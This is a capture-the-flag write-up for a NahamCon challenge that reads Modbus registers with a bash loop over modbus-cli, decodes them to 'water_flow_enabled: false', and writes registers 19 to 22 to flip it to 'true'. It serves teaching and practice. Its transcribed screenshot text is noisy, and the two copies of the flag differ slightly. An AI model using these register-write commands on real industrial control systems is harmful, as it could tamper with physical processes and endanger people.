# Where's My Water?
> Swampy's water has stopped working again just before his shower.
> Can you help him get the water running again?
> The other alligators said something about busmod... Whatever that is.

## About the Challenge
We got 2 servers, first we can access it using browser and here is the preview


[Image extracted text: 6 >
C
Not secure
challenge nahamconcom 32431
Swampy says the water still doesn't work]


And the other server, we need to access it using [modbus-cli](https://github.com/favalex/modbus-cli)

## How to Solve?
First, we need read the register, i have a created a bash script like this

```
#!/bin/bash
for i in {1..90}
do
  modbus challenge.nahamcon.com:31112 $i
done
```

Run the script and we got something like this


[Image extracted text: root@LAPTOP-FOL3RGSH: /home/daffainfo#
bash
test
sh
Parsed
registers
definitions
from
files
1:
97
0x61
Parsed
registers
definitions
from
files
2 :
116
Ox74
Parsed
registers
definitions
from
files
3:
101
0x65
Parsed
registers
definitions
from
files
4:
114
Ox72
Parsed
registers
definitions
from
files
5:
95
OxSf
Parsed
registers
definitions
from
files
6:
102
0x66
Parsed
registers
definitions
from
files
7:
108
Ox6c
Parsed
registers
definitions
from
files
8 :
111
Ox6f
Parsed
registers
definitions
from
files
9:
119
0x77
Parsed
registers
definitions
from
files
10:
95
OxSf
Parsed
registers
definitions
from
files
11:
101
0x65
Parsed
registers
definitions
from
files
12:
110
Ox6e]


Take the decimal number and then convert it to a character and you will get this result


[Image extracted text: Recipe
Input
119CR
From Decimal
97cR
116cR
Delimiter
CRLF
Support signed values
101cR
114CR
95cr
102cR
108 cR
111CR
119CR
95cR
101cR
110CR
97cR
111
Output
wwater
flow_enabled: false]


Change the `water_flow_enabled` value from `false` to `true` using modbus-cli (Rewrite the register). Here is the command I used to solve rewrite the register

```shell
modbus challenge.nahamcon.com:32299 19=116 # f -> t
modbus challenge.nahamcon.com:32299 20=114 # a -> r
modbus challenge.nahamcon.com:32299 21=117 # l -> u
modbus challenge.nahamcon.com:32299 22=101 # s -> e
```


[Image extracted text: root@LAPTOP-FOL3RGSH: /home
daffainfo#
modbus challenge
nahamcon
com
32299 19=116
# f - t
modbus
challenge.nahamcon. com
32299
20-114
73
modbus
challenge .nahamcon _
com
32299 21-117
# 1
~> u
modbus challenge .nahamcon. com
32299
22-101
#
73
Parsed
registers
definitions
from
files
Parsed
registers definitions
from
files
Parsed
registers
definitions
from
files
Parsed
registers
definitions
from
1 files]


And then access the first server to obtain the flag


[Image extracted text: 6 
C
Not secure
challenge nahamconcom 32431
The water is on!
flag{fe01fd254c40488f93f164e2343ed0044c6d87d3}]


```
flag{fe01fd254c40488ff3f164e2343cd0044c6d87d3}
```